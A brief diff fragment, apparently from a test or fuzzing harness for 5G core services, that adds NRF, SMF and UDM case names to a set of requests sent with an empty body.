+                           # NRF gap-fill GETs
+                           'nrf_disc_no_params',
+                           # SMF gap-fill DELETE
+                           'smf_ctx_modify_no_ctx',
+                           # UDM SDM subscription DELETE (lifecycle chain)
+                           'udm_sdm_sub_delete'):
         return b''
 
     # Oversized body variant: cycle through OVERSIZED_BODIES by pdu_session_id
